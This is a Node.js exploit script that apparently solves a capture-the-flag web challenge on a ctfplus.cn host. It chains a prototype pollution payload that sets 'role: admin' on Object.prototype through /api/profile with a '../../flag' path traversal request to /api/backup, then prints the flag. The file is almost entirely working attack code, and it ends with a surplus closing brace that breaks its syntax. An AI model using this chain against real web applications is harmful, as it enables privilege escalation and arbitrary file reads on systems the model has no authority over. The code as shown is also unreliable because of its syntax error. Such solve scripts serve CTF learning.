
const http = require('http');
const querystring = require('querystring');

function doRequest(options, callback) {
  const req = http.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => {
      data += chunk;
    });
    res.on('end', () => {
      callback(null, res, data);
    });
  });
  req.on('error', (err) => {
    callback(err);
  });
  req.end();
}

const existingUid = "2ca01c4924cc40e5b0c303f33d0aa184";
console.log("1. Login existing user...");
const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(querystring.stringify({uid: existingUid}))
  }
};

doRequest(loginOpts, (err, res, body) => {
  if (err) {
    console.error("Login failed", err);
    return;
  }
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("✅ Login done, poisoning prototype...");
  const poisonBody = JSON.stringify({
    uid: existingUid,
    "constructor": {
      "prototype": {
        "role": "admin"
      }
    }
  });
  const poisonOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(poisonBody),
      'Cookie': cookie
    }
  };

  doRequest(poisonOpts, (err, res, poisonBody) => {
    if (err) {
      console.error("Poison failed", err);
      return;
    }
    console.log("✅ Poison done, register new user...");
    const regBody = querystring.stringify({username: "finaldone123"});
    const regOpts = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: '/register',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(regBody)
      }
    };

    doRequest(regOpts, (err, res, regBodyStr) => {
      if (err) {
        console.error("Register failed", err);
        return;
      }
      const match = regBodyStr.match(/<span.*?>([a-f0-9]+)<\/span>/);
      if (!match) {
        console.log("Didn't find UID, response:");
        console.log(regBodyStr);
        return;
      }
      const newUid = match[1];
      console.log(`✅ Registered, new UID: ${newUid}`);
      console.log("✅ Login new user...");
      const newLoginBody = querystring.stringify({uid: newUid});
      const newLoginOpts = {
        hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
        port: 80,
        path: '/login',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(newLoginBody)
        }
      };

      doRequest(newLoginOpts, (err, res, newLoginBody) => {
        if (err) {
          console.error("New login failed", err);
          return;
        }
        const newCookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
        console.log("✅ Logged in, getting flag...");
        const flagBody = querystring.stringify({file: '../../flag'});
        const flagOpts = {
          hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
          port: 80,
          path: '/api/backup',
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(flagBody),
            'Cookie': newCookie
          }
        };

        doRequest(flagOpts, (err, res, flagBody) => {
          if (err) {
            console.error("Get flag failed", err);
            return;
          }
          console.log("\n\n======================");
          console.log("🎯 FINAL FLAG RESULT:");
          console.log(flagBody);
          console.log("======================");
        });
      });
    });
  });
});
});
